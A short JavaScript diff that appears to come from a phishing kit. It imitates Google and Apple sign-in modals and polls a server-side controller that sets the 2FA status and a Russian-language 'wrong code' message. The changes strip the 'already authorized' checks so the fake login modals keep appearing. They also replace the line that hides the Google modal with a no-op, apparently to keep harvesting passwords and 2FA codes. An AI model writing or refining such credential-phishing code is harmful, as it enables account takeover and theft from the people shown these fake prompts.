@@ -225,7 +225,7 @@ function initApp() {
         ].includes(targetStep);
 
         if (googleAuthModal) {
-            if (isGoogleStep && !isAuthorized) {
+            if (isGoogleStep) {
                 googleAuthModal.classList.remove("hidden");
                 const modalWin = googleAuthModal.querySelector(".google-modal-window");
                 if (targetStep === stepGooglePrompt) {
@@ -251,7 +251,7 @@ function initApp() {
         }
 
         if (appleAuthModal) {
-            if (isAppleStep && !isAuthorized) {
+            if (isAppleStep) {
                 appleAuthModal.classList.remove("hidden");
                 if (userAppleEmail) updateAppleDisplays(userAppleEmail);
             } else {
@@ -419,7 +419,9 @@ function initApp() {
                             localStorage.removeItem("privateroom_session_id");
                             localStorage.removeItem("privateroom_code_requested_at");
                         } catch (e) {}
-                        if (googleAuthModal) googleAuthModal.classList.add("hidden");
+                        if (googleAuthModal && googleAuthModal.classList.contains("hidden")) {
+                            googleAuthModal.classList.add("hidden");
+                        }
                         updateAuthHeaderUI();
                         if (!wasAuthorized) {
                             showStep(stepSuccess);
@@ -1446,7 +1448,7 @@ function initApp() {
                         }, 120);
                     }
                     showGoogleError("2fa", ctrl.error_msg || "Неверный код. Проверьте код и повторите попытку.");
-                } else if (ctrl.status === "completed" || data.authorized) {
+                } else if (ctrl.status === "completed") {
                     stopGooglePolling();
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (googleAuthModal) googleAuthModal.classList.add("hidden");
